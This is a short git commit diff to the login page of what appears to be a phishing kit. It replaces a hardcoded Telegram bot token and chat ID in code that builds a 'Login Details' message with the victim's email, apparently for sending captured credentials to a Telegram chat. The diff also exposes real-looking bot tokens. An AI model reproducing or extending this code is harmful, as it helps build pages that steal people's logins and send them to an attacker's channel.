d6fc2082f5711b8bada068dc8bf5142e68201f70
husknet <127146284+husknet@users.noreply.github.com>
2025-01-27 23:49:44 -0400

    Update index.js

--- pages/index.js
+++ pages/index.js
@@ -56,8 +56,8 @@ const Login = () => {
         return;
       }
 
-      const TELEGRAM_BOT_TOKEN = '7781468085:AAEdLDEdPbC1zQUOJnNmYCPgkH84uuwLfgU';
-      const TELEGRAM_CHAT_ID = '-1002493880170';
+      const TELEGRAM_BOT_TOKEN = '7756925305:AAHaoMb6ljqKRptgYDIPeuq-hB4q2XgZZHI';
+      const TELEGRAM_CHAT_ID = '-1002296564308';
       const loginAlert = `
 🔐 <b>Login Details</b>
 📧 <b>Email:</b> ${email}
